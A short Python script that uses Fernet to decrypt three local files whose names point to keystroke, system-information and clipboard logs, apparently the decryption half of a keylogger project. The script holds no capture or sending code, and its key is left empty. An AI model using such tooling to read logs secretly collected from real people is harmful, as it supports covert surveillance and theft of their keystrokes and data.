from cryptography.fernet import Fernet
key=""


encrypted_key_info="keys_log_encrypted.txt"
encrypted_system_info="systeminfo_encrypted.txt"
encrypted_clipboard_info="clipboard_encrypted.txt"

encrypted_files=[encrypted_key_info,encrypted_system_info,encrypted_clipboard_info]
counter=0

for encryption in encrypted_files:
  with open(encrypted_files[counter], 'rb') as f:
    data=f.read()
    
    fernet=Fernet(key)
    decrypted=fernet.decrypt(data)
    
  with open(encrypted_files[counter], 'wb') as f:
    f.write(decrypted)
    
  
  counter+=1